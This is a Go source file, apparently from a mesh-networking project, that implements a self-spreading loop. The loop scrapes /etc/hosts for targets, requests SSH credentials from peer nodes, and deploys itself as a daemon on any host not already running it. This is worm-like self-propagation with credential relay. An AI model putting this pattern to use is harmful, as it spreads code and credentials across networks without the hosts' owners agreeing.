package main

import (
	"context"
	"log/slog"
	"net"
	"os"
	"strings"
	"time"

	"github.com/cortex-mesh/cortex-mesh/api"
	"github.com/cortex-mesh/cortex-mesh/transport"
	"github.com/cortex-mesh/cortex-mesh/vault"
	"golang.org/x/crypto/ssh"
)

// startSpreader initiates the autonomous spreading loop.
// It continuously attempts to discover and connect to peers, requesting
// credentials for unreachable hosts and deploying the mesh across the network.
func startSpreader(ctx context.Context, node *api.Node, seeds []string, v *vault.Vault) {
	go func() {
		localHosts := scrapeEtcHosts()
		allTargets := append(seeds, localHosts...)

		// Map of dialed targets to prevent immediate reconnect storms.
		dialed := make(map[string]time.Time)

		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()

		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				// Try to dial targets. Add discovered nodes from node.AllDialTargets() eventually.
				for _, target := range allTargets {
					if target == "" || target == "127.0.0.1" || target == "localhost" || target == "::1" {
						continue
					}

					// Simple backoff
					if last, ok := dialed[target]; ok && time.Since(last) < 2*time.Minute {
						continue
					}

					dialed[target] = time.Now()

					// Attempt normal TCP connection on port 4443 first (the persistent daemon port).
					slog.Debug("spreader: attempting to join peer", "target", target)
					var d net.Dialer
					conn, err := d.DialContext(ctx, "tcp", net.JoinHostPort(target, "4443"))
					if err == nil {
						if joinErr := node.AddPeer(ctx, conn, false); joinErr == nil {
							slog.Info("spreader: joined mesh via TCP/mTLS", "target", target)
							continue
						}
						_ = conn.Close()
					}

					// HTTPS failed (peer not running).
					// Try to deploy the node persistently via SSH.
					slog.Info("spreader: node missing, attempting deployment", "target", target)

					var sshCred *vault.Credential

					if v != nil {
						// Check local vault first.
						val, ok := v.Match(target)
						if ok {
							sshCred = &val
						}
					}

					// If we don't have it locally, request from the mesh.
					if sshCred == nil {
						slog.Info("spreader: requesting credentials from mesh", "target", target)
						reqCtx, reqCancel := context.WithTimeout(ctx, 15*time.Second)
						remoteCred, reqErr := node.RequestCredential(reqCtx, target)
						reqCancel()
						if reqErr == nil && remoteCred != nil {
							sshCred = remoteCred
							// Store the acquired credential locally for future use
							if v != nil {
								v.Store(target, *sshCred)
							}
						} else {
							slog.Debug("spreader: no credentials available for target", "target", target, "error", reqErr)
							continue
						}
					}

					// We have credentials, deploy.
					deployCtx, deployCancel := context.WithTimeout(ctx, 30*time.Second)

					var signer ssh.Signer
					if len(sshCred.PrivateKey) > 0 {
						var parseErr error
						signer, parseErr = ssh.ParsePrivateKey(sshCred.PrivateKey)
						if parseErr != nil {
							slog.Warn("spreader: failed to parse private key", "target", target, "error", parseErr)
							deployCancel()
							continue
						}
					}

					deployCred := transport.DeployCredential{
						SSHUser:    sshCred.Username,
						SSHKeyData: signer,
						SSHPass:    sshCred.Password,
					}

					deployer := &transport.SelfDeployer{
						ExecArgs: []string{"-daemon"},
					}

					slog.Info("spreader: executing autonomous deployment", "target", target)
					targetWithPort := net.JoinHostPort(target, "22")
					deployStream, deployErr := deployer.Deploy(deployCtx, targetWithPort, deployCred, nil)
					deployCancel()

					if deployErr != nil {
						slog.Warn("spreader: deployment failed", "target", target, "error", deployErr)
						continue
					}

					// Deployment successful (process launched and detached)
					_ = deployStream.Close() // Close the connection as -daemon means it will detach.

					time.Sleep(2 * time.Second) // Give the daemon a moment to boot

					joinConn, tcpErr := d.DialContext(ctx, "tcp", net.JoinHostPort(target, "4443"))
					if tcpErr == nil {
						joinErr := node.AddPeer(ctx, joinConn, false)
						if joinErr != nil {
							slog.Warn("spreader: failed to join newly deployed node", "target", target, "error", joinErr)
							_ = joinConn.Close()
						} else {
							slog.Info("spreader: autonomous deployment and mesh join successful", "target", target)
						}
					} else {
						slog.Warn("spreader: failed to dial newly deployed node", "target", target, "error", tcpErr)
					}
				}
			}
		}
	}()
}

// scrapeEtcHosts reads /etc/hosts and extracts non-loopback IPs/hostnames.
func scrapeEtcHosts() []string {
	data, err := os.ReadFile("/etc/hosts")
	if err != nil {
		return nil
	}

	var hosts []string
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.SplitN(line, "#", 2)[0]
		fields := strings.Fields(line)
		if len(fields) >= 2 {
			if fields[0] != "127.0.0.1" && fields[0] != "::1" && !strings.HasPrefix(fields[0], "fe80") {
				hosts = append(hosts, fields[1])
			}
		}
	}
	return hosts
}
